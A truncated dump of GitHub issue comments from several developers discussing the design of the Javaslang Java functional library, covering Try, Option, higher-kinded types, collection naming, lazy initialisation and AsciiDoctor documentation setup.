get your projects, and the JDK/ Guava /TotallyLazy etc, to work together seamlessly!\nMark, under the hood this was very heavily influenced by the fantastic work you did in FunctionalGroovy (e.g.  Groovy For Comprehensions). It started off totally dynamic and types have been added gradually. It's a process and it's definitely not complete (particularly for For Comprehensions). \nI think type safety for AnyM is reasonably good (although I'm sure there are still bugs / holes to be found), at least if the Monad/ Monad-like class being wrapped takes a single generic parameter. You can create a factory method such as\npublic static <T> AnyM<T> anyM(CompletableFuture<T> anyM){\n      return new MonadWrapper<>(anyM).anyM();\n }\nand calling  it will preserve the type e.g. \nCompletableFuture<Data> cf;\nAnyM<Data> monadWithData = asAnyM(cf);\nTypes would then change as normal when map / flatMap etc are applied.\nAnyM<String> monadWithString = monadWithData.map(data -> data.toString());\nOne concern would be, if you needed to get back to the wrapped CompletableFuture, AnyM could be anything. But something along these lines should work, and be guaranteed to always return a CompletableFuture (i.e. if monadWithString wraps an Optional, we will still get a CompletableFuture back).\nCompletableFuture<String> cf2 = asAnyM(CompletableFuture.completedFuture(\"\"))\n                                                        .bind( str -> monadWithString.unwrap())\n                                                        .unwrap();\nIt's a little long winded, if you wanted to live dangerously, the following would work in our case (but blow up if code elsewhere was passing a Stream or a Try etc).\nCompletableFuture<String> cf2 = monadWithString.unwrap();\nInternally when a method is called, the actual method to be invoked on the wrapped Monad will be resolved by a Comprehender implementation. If no specific Comprehender has been implemented for the Monad type being wrapped, an InvokeDynamicComprehender will attempt pass on the method invocation.\n. @danieldietrich  Hi Daniel,  cyclops-javaslang integration is now available in Maven Central. There are converters to Javaslang types (Tuples, Functions, Streams etc) from Guava, JDK, FunctionalJava and simple-react. But also included are Comprehenders for Javaslang monads (as of Javaslang 1.2.2).\nThis means you can use Cyclops For Comprehensions (which are now strongly typed) with Javaslang, JDK and Cyclops Monads. E.g. Example below shows a mixed For Comprehension with a JDK CompletableFuture and a Javaslang List.\nCompletableFuture<String> future = CompletableFuture.supplyAsync(this::loadData);\n   CompletableFuture<List<String>> results1 = Do.add(future)\n                                                    .add(Javaslang.anyM(List.of(\"first\",\"second\")))\n                                                    .yield( loadedData -> localData-> loadedData + \":\" + localData )\n                                                    .unwrap();\nWhere this::loadData returns \"loaded\" the output from\nSystem.out.println(results1.join());\nis\nList(loaded:first, loaded:second)\nWith the whole thing being executed asyncrhonously.\nYou can also use the AnyM abstraction directly with Javaslang monads (AnyM is released as part of Cyclops 5.0.0). E.g. here is AnyM treating a Javaslang Try as Success biased (default behaviour)\nassertThat(Javaslang.anyM(Try.of(this::success))\n        .map(String::toUpperCase)\n        .toSequence()\n        .toList(),equalTo(Arrays.asList(\"HELLO WORLD\")));\nAnd a similar example, treating a Javaslang Try as Failure biased \nException e = new RuntimeException();\nassertThat(Javaslang.anyMFailure(new Failure(e))\n            .toSequence()\n            .toList(),equalTo(Arrays.asList(e)));\nI think we can regard this as something like a first draft, I think we can significantly improve this over time (for example by creating a Javaslang native for comprehension builder) - if there is interest to do so..\nThese links might be interesting \nCyclops for comprehensions\nCyclops for comprehensions Javadoc\nCyclops AnyM javadoc\n@mperry  Hi Mark, I would hope to have a similar module available for FunctionalJava over the next couple of weeks.\n. @danieldietrich  Would this work? To produce a map view on a list, the key = index, value = value \nMap<Integer,T>  listViewedAsMap;\n. And vice versa \nList<Map.Entry<K,V>>  mapViewedAsList;\n. I haven't implemented any direct support for Map yet, AnyM only accepts one type so that would force you to either drop one type (key or value) or use a Tuple2 for a map.\nFor Tuple2 you would get something like this \nAnyM<Tuple2<Key,Value>> map;\nThe main problem being that map and flatMap can return something other than a Tuple2, which makes that problematic, without putting special rules in place (e.g. if you return a Tuple2 both the key and value are changed, otherwise the monad is converted to a List of the returned values)\nYou could argue that inside an AnyM the value is the most interesting property, since operations effectively iterate rather than looking up by key \nAnyM<Value> map;\nBut you then lose the ability to change the key.\nThe second approach is less powerful, but less likely to violate the principal of least surprise. Because you are inheriting from monad rather than wrapping it, not sure either of theses approaches is feasible for the javaslang Monad interface.\n. No worries, it's useful to think about, I should add support for Maps into cyclops at some point. Thinking a bit more about, it would be best (in cyclops) to let the user decide at AnyM creation time what properties they wanted to target (key, value or key and value) - for later the underlying datastructure would be converted to a List (at creation) for the other two only one property could be manipulated. I'd need to try a few experiments though.\n. If you are interested I've created Derive4j HKT encodings and type class instances (Unit, Functor, Applicative, Monad, MonadZero, MonadPlus, Comonad, Traversable & Foldable) for Javaslang types inside the cyclops-javaslang project. Because they are using Derive4j they will also work with HighJ\nJavaslang HKT 'type constructors'\nJavaslang Type classes. @danieldietrich If you need a List, use a List :)\nUser: I need to encode a computation based on a List of elements.\nAnswer: Use a list\nUser: I would like to encode an abstract computation over monads or applicatives so it is reusable across all such types\nAnswer: (In the absence of HKT and type classes) whistles.... ",
    "RobWin": "-1 \nNo compile dependency to guava please :)\n. Ok. Thx for the explanation.\n. Yes. This is better :)\n. Do you want to focus on source code examples? \n- AsciiDoctor is better than Markdown, if you want to show code examples and highlight important parts.\nDo you want to be able to update the documentation on a tablet using just a Browser instead of using a developer notebook with Git and other tools installed?\n- You could use GitHub, TravisCI and AsciiDoctor for that\n- Or readme.io\nDo you need offline documentation?\n- AsciiDoctor can generate the same documentation in HTML, PDF and EPUB.\n. GitHub wiki sucks.\nAsciiDoctor documentation looks like this: \nhttp://griffon-framework.org/guide/2.4.0/\nAs I said Markdown sucks compared to AsciiDoctor, but the syntax is quite similar.\n. No one wants to write text in XML! :)\nHave a look at http://www.asciidocfx.com/ as a nice tool to write in AsciiDoctor with a live view.\nYou can use the maven-plugin to convert AsciiDoc into PDF and HTML and publish it on GitHubPages.\nhttps://github.com/asciidoctor/asciidoctor-maven-plugin\nI have a build chain implemented in Gradle.\n. But the writer does see the difference, if you dont use a tool for docbook.\nAsciidoc can be converted to DocBook as well.\n. Have a look at Spring Boot Docs too see how they are doing it with Maven\nhttps://github.com/spring-projects/spring-boot/tree/master/spring-boot-docs\nSince the documentation is in a Git Repo, you can tag it with your release and link multiple versions on your website. See as an example: http://projects.spring.io/spring-boot/\n. Is Javaslang a standard GitHub account or an organsiation?\nCreate another repo or maven module called javaslang-docs and the folder src/main/asciidoc.\nCreate an index.adoc which includes all other files and specifies some constants. See as an example https://github.com/spring-projects/spring-boot/edit/master/spring-boot-docs/src/main/asciidoc/index.adoc\n. Add the AsciiDoctor maven plugin\n,xml\n<plugin>\n                        <groupId>org.asciidoctor</groupId>\n                        <artifactId>asciidoctor-maven-plugin</artifactId>\n                        <version>1.5.2.1</version>\n                        <executions>\n                            <execution>\n                                <id>generate-docs</id>\n                                <phase>generate-resources</phase>\n                                <goals>\n                                    <goal>process-asciidoc</goal>\n                                </goals>\n                                <configuration>\n                                    <sourceDocumentName>index.adoc</sourceDocumentName>\n                                    <backend>html5</backend>\n                                </configuration>\n                            </execution>\n<execution>\n            <id>output-docbook</id>\n            <phase>generate-resources</phase>\n            <goals>\n                <goal>process-asciidoc</goal>\n            </goals>\n            <configuration>\n                <backend>docbook</backend>\n                <doctype>book<\n            </configuration>\n        </execution>                        </executions>\n                    </plugin>\nhttps://github.com/asciidoctor/asciidoctor-maven-examples/blob/master/asciidoc-to-html-example/pom.xml\n. In an organisation you can have multiple repos under one common name and you can create teams and add members to teams which are allowed to contribute to different repos.\n. You dont have to add us as Team members. We still can and should contribute via PRs.\n. +1 :)\n. We could even easily add memorization (cache) for requests.\n. The retry logic can be refined anyway. The question here is where to put the logic.\nKeep in mind that we also need factory methods which return Runnable, Supplier and Function. Not only the Checked versions. Otherwhise I must always use Try and can't use Completablefuture directly.\nThis brings me back to a Rety.of() as a container for multiple static factory methods. What do you think?\n. The signature for a more complex retry logic could be: Retryable.decorate(supplier, retryConfig) so that the config is extendable.\n Retryable.decorate(runnable, retryConfig)  and so on. This signature shows the intention (Decorator pattern) better.\nWhat about moving circuitbreaker-java8 to javaslang as a javaslang-circuitbreaker module? What do you think?\n. Okidoki :) Totally comprehensible\n. Interesting blog post.\n. This issue is better than a book \n. +1 :dancers: \n. Why not just reference the AsciiDoc documentation? \nI would even delete everything in the README except an introdocution so that there is only one source of truth.\n. Can we close this issue?\n. The question is when do you want to do that when I look at the issue list. Maybe it would be a nice PR or a :santa: gift. :) Looking at @krzysztofik \n. Most important point for real production usage of collections.\n. Try has a CheckedFunction interface, but Try.mapTry() takes a CheckedFunction1.\nThis seems to be inconsistent.\n. Can we delete the CheckedFunction in Try? But then its confusing to have CheckedSupplier, CheckedConsumer in a different package than CheckedFunction1. Maybe its better to move them in the  common root package?\n. But there is not need for a CheckedFunction and a CheckedFunction1?\nAnd why should a CheckedConsumer, CheckedPredicate and CheckedRunnable have a higher cohesion to Try than to other Monads. I think it would make sense to put all @FunctionalInterfaces into the same package like in Java java.util.function.\n. Why not add it as a Javaslang-module?\n. If @danieldietrich agrees, we could move the project into the javaslang GitHub organisation and add you to a team which can mantain the javaslang-javatic repo.\nIt could help people to to find the javatic project and contribute.\n. If you agree, this would be my first PR :)\n. But it is incosistent right now, because \nOption.of(() -> jdk8Map.get(\"unknownKey\")) returns None\nAnd with lift its Some(null)\n. The code above works, because you know that Try is used internally, but I bet most users do not know it and think the  function returns None, if the lifted method returns null.\n. Ok. Then I missunderstood lift.\n. \n. Ok.I have a look at it.\nMy first thought is that the Checked* interfaces work fine, if you use lamdas. But if you want to use existing Supplier, Predicates or Functions, it does not work anymore.\nHaving two separate methods like map and mapTry does not introduce that disadvantage.\n. PECS does not help here :(\nOnly an Object argument helps in contains and indexOf.\n. In think the idea is not to copy the list, but cast. See ofAll\nif (elements instanceof List) {\n            return (List<U>) elements;\nOr am I wrong?\n. What about List.typeSafeUpCast() ?\n. List.surprise or Traumschiff.surprise() \n. Just upCast?\n. Damn, that's true. Haven't thought of that, if you use a lamba directly instead of an interface.\nYou have to decide it. Other libraries like RxJava provide factory methods for this use case, for example:\nObservable.fromCallable(). Yes, I also thought about replacing CheckedSupplier with Callable, but came to the same conclusion that Javaslang still needs Try.CheckedSupplier (or use CheckedFunction0 instead?).\nWhat about?\n```\nTry.ofCallable(Callable callable)\nTry.ofSupplier(Supplier supplier)\nTry.runRunnable(Runnable runnable)\nFuture.ofCallable(Callable callable)\nFuture.ofSupplier(Supplier supplier)\nFuture.runRunnable(Runnable runnable)\n``. Shall I create a PR for Try?. Done. I thought about it as well, but then we have two null checks? Is that really necessary?. Done. \ud83d\udc4d . Try to set sun.jnu.encoding=UTF-8. Did you trysystemProp.sun.jnu.encoding=UTF-8`?. I love the new sequence :). Okidoki. Sure? I have to test this.. You are right. I didn't expect that.. Yes, Assertj rocks :). ",
    "jbgi": "You could also design match to use this syntax:\n``` java\nNumber i = Integer.valueOf(1);\nBigDecimal asBigDecimal =\nMatch.of(i)\n     .when((Integer i) -> new BigDecimal(i))\n     .when((BigDecimal bd) -> bd)\n     .getOrElse(BigDecimal.ZERO);\nOption asBigDecimalOption =\nMatch.of(i)\n     .when((Integer i) -> new BigDecimal(i))\n     .when((BigDecimal bd) -> bd)\n     .get();\n```\nalso only Function<? extends Number, R> should be allowed as when argument, IMO.\nand the first when argument determine the type of R. (that would require a smarter Match builder)\n. You may be interested in https://github.com/sviperll/adt4j and a recent design discussion of the project: https://github.com/sviperll/adt4j/issues/20\n. And now also https://github.com/derive4j/derive4j\n(no special support for javaslang... yet!)\n. In order to add special support for javaslang into derive4J, what I would need is a none and a some static factory method in the Option interface. the methods should return an Option (not a Some or a None). Same for Either, with left and right constructors.\n. The main problem is type inference. Derive4J use invariant generics: using explicit subtyping (new Some() / None.instance()) will probably breaks generated code.\n. I did some tests, it complicate things a little bit but should be doable.\nFrom a user point a view I still thinks that having some/none constructors in Option that return Option is a good thing. Sub-typing complicate usage of parametric polymorphism a lot and I find the later far more useful for FP than the former.\n. @danieldietrich ok. now what I would suggest is to refrain from using algebra/category theory terms in javaslang(-core) unless the actual abstraction strictly adhere to the associated definition/laws. And we will let the pure module provides the correct implementations of those abstractions, (alla highj).\nSo if, for instance, you want to make Monad extend Iterable then let's not use Monad as a name, please rename it to WithFlatMap or something. (and maybe actually rename the algebra package to internal)\nWhy? because otherwise it will confuse people that are trying to learn functional programming abstractions. They will have the wrong idea of what Monad or other FP abstractions are. (it's already confusing that the current Monad interface does not provide the unit method).\n. IMO collection views and conversion methods is a better alternative to a complex type hierarchies that often cause blurring of concepts. It also allows to get ride of (confusing) variance annotations.\n. @danieldietrich true!\n. @danieldietrich for a module similar to semigroupoids to exists there is only one requirement: that all public data and function classes, that are leaf in the type hierarchy, implement Kind (it does not need to appear elsewhere like in methods signature). But without Kind no semigroupoids/pure module... \n. +1 for switching type parameters. also Functor should be probably extends Type/HigherKind. But what about using a visualy light class name like hk<> or __<> (alla highj)?\n. just that only one underscore give a javac warning.\n. we need narrow to be static otherwise it is of no use (you call a method on Monad<M,T> to narrow it to Monad<M,T>: this is the identity function)\nand the cast is unfortunately necessary (otherwise it would mean that we have safely solved higher kinded type in Java).\n. @danieldietrich the narrow method is here to isolate factorize the dirty work. Also it can be then used as a method reference. I agree that the method would need to be labelled \"For advanced/internal usage only\".\nMy use case is to factorize traversal code of the various optics.\nWhat I would also need is a way to abstract over data constructors (for unit).\nI will try to submit a PR for all of that. (I will be very busy in the next two weeks so that may be in a month or so).\n. Thanks, you too!\nAlso, CONTRIBUTING mention eclipse_formatter.xml and idea-settings.jar files but I cannot find them... ?\n. @martin-g thanks!\n. well, map (from Functor) should preserve structure, so for a Map that would be:\njava\n<V2> Map<K, V2> map(Function<V, V2> mapper);\ngiven the above definition of map and one of (need to check if both compile correctly):\njava\ninterface Map<K, V> extends Kind<Kind<Map<?,?>, K>,V> ...\njava\ninterface Map<K, V> extends Kind<Map<K,?>,V> ...\nthen implementing Functor should work.\n. What I don't like about java interface is that you cannot annotate a (default) method with final (unlike scala trait). therefore you cannot be sure that the implementation you see in a default method will be the one you get at runtime. (there also can be a performance advantage to final methods, but not sure...)\n. ConcurrentHashMap is, by default, optimized for large number of writer (default concurrency level = 16). This is rarely a good default. I would suggest using the alternate constructor that allow to specify the concurrency level (and use something like 1 or 2). This should provide better performances for the common single-threaded use-case.\n. oups my bad, I still had the old ConcurrentHashMap implementation in mind. \n. So how about making a type parameter of the particular subtype of throwable\nthe function may throw?\nOn Tue, May 26, 2015 at 6:18 PM, Martin Grigorov notifications@github.com\nwrote:\n\nI agree with the reporter that catching Error/Throwable in library code\nshould be avoided.\nIf other libraries abuse the meaning of Error then it's their own problem.\nI'd let the application decide whether to try to recover from\nError/CustomThrowable.\nOn May 26, 2015 6:11 PM, \"Daniel Dietrich\" notifications@github.com\nwrote:\n\nHi,\nthank you for the question!\nFor example, a StackOverflowError is considered ad recoverable (see here\n<\nhttps://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/control/Failure.java#L211\n).\nIt is interesting, that Scala considered StackOverflowError in 2.10.x as\nnon-fatal (see here\n<\nhttp://www.scala-lang.org/api/2.10.4/index.html#scala.util.control.NonFatal%24\n)\nand in 2.11.x as fatal (see here\n<\nhttp://www.scala-lang.org/api/2.11.5/index.html#scala.util.control.NonFatal%24\n).\nHowever, in general it would be too restrictive only considering\nException\nad non-fatal. 3rd party frameworks may invent their own exceptions\nextending Throwable or may even throw Errors as recoverable exceptions\n(which is not recommended - but they do!).\nI think, this is the best way to go but I'm always open for new ideas!!\nGreets,\nDaniel\n\u2014\nReply to this email directly or view it on GitHub\n<\nhttps://github.com/javaslang/javaslang/issues/273#issuecomment-105558977>\n.\n\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/273#issuecomment-105586238\n.\n. @danieldietrich I think CheckFunction could be parametrized without Try taking advantage of it (still catching throwable).\nalso to address the original comment, maybe there could an alternate Try.of method that catch only non fatal exceptions (as per https://github.com/scala/scala/blob/2.12.x/src/library/scala/util/control/NonFatal.scala).\n. an annotation processor is being worked on to add type-safety to the highj encoding. See derive4j/hkt#1 (input welcomed).\n. @danieldietrich I spent some times recently on how best implement Semigroup/Monoid in Java. Result have been merged into fugue, if you want to have a look: https://bitbucket.org/atlassian/fugue/pull-requests/51/fixed-37-semigroups-and-monoids/diff\n. yeah. It should be on Foldable (or Fold using lenses): https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/data/optic/Fold.java#L26\n. foldRight combine should be lazy in it second arguments otherwise you cannot implements short-circuiting logic with it.\n=>\nfoldRight(U zero, BiFunction<? super T, ? extends Supplier<? super U>, ? extends U> combine)\n(with the usual ugliness due to supporting subtyping ;-)\n. there is Foldable#foldRight from scalaz:\nhttps://github.com/scalaz/scalaz/blob/87058f198d0690632a9eaee8c531c1a64d4841af/core/src/main/scala/scalaz/Foldable.scala#L23\n. yeah, trampolining is slow. It would be nonetheless interesting to benchmark trampoline based folds against different GC/GC tuning. functional-java has trampoline based foldRights for Stream and List, as well as constant stack impl base on reverse+foldLeft but that does not work for infinite data structures.\n. Thanks for the response.\nI was expecting it. The reason why the hkt library could be an exception to the rule is that is intended to be an extension to the java language it-self.\nThe thing is that even if javaslang it-self does not make use of higher-kinded polymorphism, users could have benefited from the type being compatible in order to easily create type-classes instances on their own.\nBut I understand if you prefer javaslang to use inheritance polymorphism instead, for the sake of not confusing users not familiar with higher-kinded polymorphism.\n\nas for Option.some()/none() I think derive4j should be fine if they return the concrete class. Although, you may loose type inference in some situations by doing this.. I agree with what @danieldietrich said. It is true that FJ has not had a strong focus on micro-optimizations. There is surely more GC than ideal although it has improved bit by bit.\nThe fundamental \"problem\" of FJ is that its contributors often move to better languages after a while (scala(z)/haskell) so we are constantly looking for new contributors: I guess it is a testimony of the effectiveness of FJ as gateway drug to (pure) FP.\nSo if you believe that Object#equals is evil and your career plan is to move to better languages than Java, then FJ is for you: it surely have been used in production and you can learn quite a bit of FP using it.\nEven though there may be performances issues, most of the one that have been identified so far had relatively straight-forward solution.\nThe fact that FJ avoid sub-typing contribute a lot to its simplicity of maintenance and ease of reasoning.. I would keep the volatile check before assuming value is correctly intialized (otherwise I think It is possible that it points to a \"not finished\" object).\nI am also currently benchmarking lazy init schemes and I found that keeping the get method as short as possible is key to trigger inlining and the associated speedup. So the following may be prefered:\n``` java\n    @Override\n    public T get() {\n        return supplier == null\n            ? value\n            : computeValue();\n            //: computeValue_withLocalVar(); (is it faster ?)\n    }\nprivate T computeValue() {\n    synchronized (this) {\n        if (supplier != null) {\n            value = supplier.get();\n            supplier = null; // free mem\n        }\n    }\n    return value;\n}\n\nprivate T computeValue_withLocalVar() {\n    T v;\n    // using a local var speeds up the double-check idiom by 25% (maybe??), see Effective Java, Item 71\n    synchronized (this) {\n        Supplier<? extends T> tmp = supplier;\n        if (tmp != null) {\n            value = v = tmp.get();\n            supplier = null; // free mem\n        } else {\n            v = value;\n        }\n    }\n    return v;\n}\n\n```\nI could not get @paplorinc benchmark working so this still need to be validated...\n. note that with this change, the method is now unsafe:\njava\n  Value<Option<Integer>> value = of(some(1), some(2));\n  Option<Integer>[] options = value.toJavaArray(Object.class); // ClassCastException\n. I think the only solution would be to provide an array wrapper class, \u00e0 la https://github.com/functionaljava/functionaljava/blob/master/core/src/main/java/fj/data/Array.java\n. ",
    "martin-g": "@danieldietrich Maybe you have noticed it, maybe not - https://twitter.com/ScalaFact/status/606337216571260928. You can steal some ideas if there is something better ;-)\n. I personally don't mind the clashes. I like Scala's import renaming but I don't mind using FQN in Java when needed.\nHere is another solution: add _Name as an alias of Name, e.g.:\njava\npackage javaslang.list;\npublic class List {\n...\n}\njava\npackage javaslang.list;\npublic class _List extends javaslang.list.List {}\nThis way people can import the _Name if they prefer it.\n. For lambdas lower number is OK.\nBut for Tuple I am not so sure.\nI guess you already know that Scala supports arity of 22. There were many complains at http://slick.typesafe.com/ that sometimes the DB result/record could not fit in 22. So they replaced the usage of Tuple with HList.\nIn my personal experience I rarely needed something bigger than Triple.\n. I am not sure but it looks to me that some Oracle developer uses bad/incomplete regex (e.g. ^_\\w+) to detect when _ is used. I guess it is a matter of time to improve it to check for ^_+\\w+\n. I may be wrong!\n. But using ascii art for names reminds me of all the complains about Scala operator overloading and its overuse.\nI'd vote for HK<>.\n. idea-settings.jar is in .ide/ subfolder.\n. I agree with the reporter that catching Error/Throwable in library code\nshould be avoided.\nIf other libraries abuse the meaning of Error then it's their own problem.\nI'd let the application decide whether to try to recover from\nError/CustomThrowable.\nOn May 26, 2015 6:11 PM, \"Daniel Dietrich\" notifications@github.com wrote:\n\nHi,\nthank you for the question!\nFor example, a StackOverflowError is considered ad recoverable (see here\nhttps://github.com/javaslang/javaslang/blob/master/src/main/java/javaslang/control/Failure.java#L211\n).\nIt is interesting, that Scala considered StackOverflowError in 2.10.x as\nnon-fatal (see here\nhttp://www.scala-lang.org/api/2.10.4/index.html#scala.util.control.NonFatal%24)\nand in 2.11.x as fatal (see here\nhttp://www.scala-lang.org/api/2.11.5/index.html#scala.util.control.NonFatal%24\n).\nHowever, in general it would be too restrictive only considering Exception\nad non-fatal. 3rd party frameworks may invent their own exceptions\nextending Throwable or may even throw Errors as recoverable exceptions\n(which is not recommended - but they do!).\nI think, this is the best way to go but I'm always open for new ideas!!\nGreets,\nDaniel\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/javaslang/javaslang/issues/273#issuecomment-105558977\n.\n. String#format() is rather slow operation.\nSince there is no special formatting I'd recommend to use normal String concatenation or using StringBuilder. It is faster and still readable.\n. If it is for debugging then it is OK. No need to change it.\n. java\n Returns a list string representation of this tree.\n     *\n     * @return A new string\n     */\n    default String toLispString() {\n\nThe javadoc says list. The name of the method is lisp. \nLooking at the code it does look like LISP (produces many braces :-) ).\nIs there a typo in the javadoc?\n. Shouldn't \"$woops\" actually be s\"$woops\".\nThe same happens few times below too.\n. ",
    "sirinath": "Something like this: \n```\nVal a = new Val<>();\nVar x = new Var<>();\nVar y = new Var<>(() -> a.get() * x.get());\nVar z = new Var<>(() -> a.get() + x.get());\nVar r = new Var<>(() -> {\n    int res = y.get() + z.get();\n    System.out.println(\"res: \" + res);\n    return res;\n});\nFiber<?> f = new Fiber(() -> {\n    for (int i = 0; i < 200; i++) {\n        x.set(i);\n        Strand.sleep(100);\n    }\n}).start();\nStrand.sleep(2000);\na.set(3); // this will trigger everything\nf.join();\n```\n(Sourced from: http://docs.paralleluniverse.co/quasar/)\nAlso see documentation of: https://github.com/lihaoyi/scala.rx\n. I guess GPars is the most complete implementation. Perhaps you can look under the hood for what is happening.\n. In the JS world this is a very interesting implementation: http://noflojs.org/\n. If you use a promise or future you can only generate one final value hence can you have an option for continuous data streams also.\n. Also https://github.com/talios/javagadt/\n. I do not know how long you have to wait for Valhalla. Also look at: https://github.com/miniboxing\n. ",
    "nedtwigg": "I am the reddit commentor who objected to the name clashes.  Big fan of the library, looking forward to trying it!  I have lots of List and Stream in my code, and I didn't like that there would be ambiguity about which List and Stream.\nAs I was looking at this, I just realized that the gui toolkit that I use (SWT) has a \"List\" class, but it's used so differently from a java.lang.List that I don't ever recall any confusion.  On the other hand, that toolkit also has a \"Color\" class, and I frequently have 10 seconds of confusion as I realize my IDE grabbed the Swing/AWT Color instead of the SWT Color, because they are harder to distinguish in context.\nIn your case, your Stream and List will be used similarly to the java.lang versions, so it seems like a name change might be worthwhile. I would have guessed that the prefix for your library would be \"S\" for Slang, or possibly \"F\" for functional, but I see \"J\" as defacto the JDK's prefix.\nHaving aliases seems to violate the \"simplest possible solution\".  IMO, library version numbers are arbitrary, and there's nothing wrong with bumping a major version to indicate a name change.  A lot of libraries seem to spend a lot of time in 0.x, and don't want to go to 1.x or 2.x unless there's some major redesign.  I think library version numbers are most valuable if they are used exclusively and ruthlessly as semantic indicators.\nI recently encountered almost the same problem in an open source library that I maintain, here was my reasoning, FWIW. (aside: the class referenced in this commit is in serious risk of being deprecated for your excellent Try class :)\n. There are 3 groups you can optimize your library for:\nA) People who are already using Javaslang\nB) People who are starting a brand new project, and want to jettison java.lang.List, and any library that uses java.lang.List\nFor these people, it is better if you don't change the names.\nC) People who are developing and improving an existing project, or starting a brand new project that will need libraries that use java.lang.List\nFor these people, it is easier to adopt your project if you do change names.\nYou are in groups A and B, and probably so are most of the people you talk to about your project.  But of all the programmers out there who might use your project, the vast majority are in group C.\nGuava has ~1,000 libraries in MavenCentral that depend on it, and has java.lang.List all over its API.\nJavaslang has 0 libraries in MavenCentral that depend on it, which means you can still change API without breaking things for 1000's of people.\nI would consider my company to be an \"early-ish adopter\" of functional programming, but we've gotta keep shipping a new version to our real-life users every couple weeks, and they don't care about functional programming (or even programming at all, really).  There's no way I could budget a \"stop the world\" and replace all of our List.  And even if I did, I definitely couldn't rewrite all of our dependencies so that they don't use java.lang.List either (including transitive dependencies, we have literally 100's).\nWhen Java 8 came out, we were able to incrementally add lambdas and a functional-style to our code, updating as we went, and it never caused any confusion.  Giant projects like Eclipse are starting to undertake the same effort.  If we wanted to adopt the advantages of Javaslang, it would be quite confusing when our project gradually reached the state that half of our \"List\" weren't actually \"java.lang.List\", especially for a new team member.\nI think it's great that you're rejecting the problems with List and Stream, and creating the kernel of a newer, cleaner java.  But I think you'll have more users if you optimize for gradual adoption, rather than optimizing for clean-slates.\nBut of course, it is your project, and a great one at that, so I look forward to using it in some capacity regardless of your decision :)\n. Sounds good!  JavaSlang has lots of great ideas, I'm sure it will be successful no matter how you call them :)\nIn case you ever revisit this, here is an example of using prefixing to allow easy interoperability, and here are more detailed thoughts on optimizing for conservative users versus the ones you already have.\n. ",
    "szarnekow": "In Xtend we support lambdas up to 6 params but I've yet to see a reasonable case with more than 4.\n. Which exception would be passed into the failure? The first one or the last one? A composite of all exceptions?\nReasoning behind this question:\nAssuming to try / retry a web request. The request may be invalid thus the first one gets a proper error message but the server may respond smth like 'too many requests from host' for the last n requests.\nAlso a delay for the retry or a filter (RetryIf) may be helpful.\n. ``` java\n        // this does NOT work because the created Arr is not an Arr\n        Arr lifeFormArr4a = new Arr(new Plant());\n    // this does work \n    Arr<LifeForm> lifeFormArr4b = new Arr<>(new Plant());\n    // because it is equivalent to this explicit form\n    Arr<LifeForm> lifeFormArr4c = new Arr<LifeForm>(new Plant());\n\n```\nso for this code\njava\n        // DOES COMPILE FINE, TOO. NOT 100% CLEAR TO ME...\n        Arr<LifeForm> lifeFormArr2 = new Arr<>(1).flatMap2(i -> new Arr<>(new Plant()));\nthe compiler finds a valid solution / substitution for the type parameters of the form\njava\n        // DOES COMPILE FINE, TOO. NOT 100% CLEAR TO ME...\n        Arr<LifeForm> lifeFormArr2 = new Arr<Integer>(1).flatMap2(i -> new Arr<LifeForm>(new Plant()));\nwhich is perfectly fine. It can be compared to a List<Object> that always also accepts Strings as valid elements to be added to it but never promises to return anything else than Objects.\nThus this signature\njava\n<R> Stream<R> flatMap(Function<? super T, ? extends Stream<? extends R>> mapper);\nappeared to be overly lax to me at a first glance, but if you enhance the scenario with a few more cases, it seems to be reasonable to rely on an unchecked cast on the declaration side. Since all types are immutable, it shouldn't harm to do that (please note that flatMap2 is the variant with the unchecked cast in this test setup).\n``` java\nimport java.util.function.Function;\npublic class Test {\npublic static void main(String[] args) {\n\n    Arr<LifeForm> lifeForm = null;\n\n    lifeForm = new Arr<>(1).flatMap1(i -> new Arr<>(new Animal()));\n    lifeForm = new Arr<>(1).flatMap1(i -> new Arr<>(new Plant()));\n    lifeForm = new Arr<>(1).flatMap1(i -> new SubArr<>(new Animal()));\n    lifeForm = new Arr<>(1).flatMap1(i -> new SubArr<>(new Plant()));\n\n    lifeForm = new Arr<>(1).flatMap2(i -> new Arr<>(new Animal()));\n    lifeForm = new Arr<>(1).flatMap2(i -> new Arr<>(new Plant()));\n    lifeForm = new Arr<>(1).flatMap2(i -> new SubArr<>(new Animal()));\n    lifeForm = new Arr<>(1).flatMap2(i -> new SubArr<>(new Plant()));\n\n    Function<Integer, Arr<? extends LifeForm>> fun1 = null;\n    Function<Integer, Arr<? extends Plant>> fun2 = null;\n    Function<Integer, Arr<LifeForm>> fun3 = null;\n    Function<Integer, Arr<Plant>> fun4 = null;\n\n    Function<Integer, SubArr<? extends LifeForm>> fun5 = null;\n    Function<Integer, SubArr<? extends Plant>> fun6 = null;\n    Function<Integer, SubArr<LifeForm>> fun7 = null;\n    Function<Integer, SubArr<Plant>> fun8 = null;\n\n    lifeForm = new Arr<>(1).flatMap1(fun1); // NOT ok\n    lifeForm = new Arr<>(1).flatMap1(fun2); // NOT ok\n    lifeForm = new Arr<>(1).flatMap1(fun3);\n    lifeForm = new Arr<>(1).flatMap1(fun4); // NOT ok\n    lifeForm = new Arr<>(1).flatMap1(fun5); // NOT ok\n    lifeForm = new Arr<>(1).flatMap1(fun6); // NOT ok\n    lifeForm = new Arr<>(1).flatMap1(fun7);\n    lifeForm = new Arr<>(1).flatMap1(fun8); // NOT ok\n\n    lifeForm = new Arr<>(1).flatMap2(fun1);\n    lifeForm = new Arr<>(1).flatMap2(fun2);\n    lifeForm = new Arr<>(1).flatMap2(fun3);\n    lifeForm = new Arr<>(1).flatMap2(fun4);\n    lifeForm = new Arr<>(1).flatMap2(fun5);\n    lifeForm = new Arr<>(1).flatMap2(fun6);\n    lifeForm = new Arr<>(1).flatMap2(fun7);\n    lifeForm = new Arr<>(1).flatMap2(fun8);\n\n}\n\nstatic class Arr<T> {\n\n    final T t;\n\n    Arr(T t) {\n        this.t = t;\n    }\n\n    <R> Arr<R> flatMap1(Function<? super T, ? extends Arr<R>> mapper) {\n        return mapper.apply(t);\n    }\n\n    @SuppressWarnings(\"unchecked\")\n<R> Arr<R> flatMap2(Function<? super T, ? extends Arr<? extends R>> mapper) {\n        return (Arr<R>) mapper.apply(t);\n    }\n}\n\nstatic class SubArr<T> extends Arr<T> {\n    SubArr(T t) {\n        super(t);\n    }\n}\n\ninterface LifeForm {\n}\n\nstatic class Animal implements 